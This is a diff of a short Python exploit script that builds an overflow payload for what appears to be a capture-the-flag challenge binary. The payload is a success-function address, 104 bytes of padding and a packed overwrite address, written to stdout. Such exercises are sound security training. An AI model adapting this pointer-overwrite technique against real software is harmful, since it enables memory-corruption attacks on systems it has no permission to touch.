@@ -1,13 +1,13 @@
 from struct import pack
 import sys
 
-new_arc = b'\x66\x12\x40' # print_challenge_success
-patch_location = b'\x70\x40\x40' # print_challenge_message
-bufferSize = 100
+ADDR_SUCCESS_ASCII = b"4199014"            # 0x401266
+BUFFER_SIZE        = 0x68                  # pad out 104 bytes from buffer
+ADDR_GLOBAL        = pack("<Q", 0x404070)  # print_challenge_message
 
-p = new_arc
-p += (bufferSize - len(new_arc)-1)*b'!'
-p += patch_location
+p  = ADDR_SUCCESS_ASCII
+p += b'!' * (BUFFER_SIZE - len(ADDR_SUCCESS_ASCII))
+p += ADDR_GLOBAL
 p += b'\n'
 
 sys.stdout.buffer.write(p)
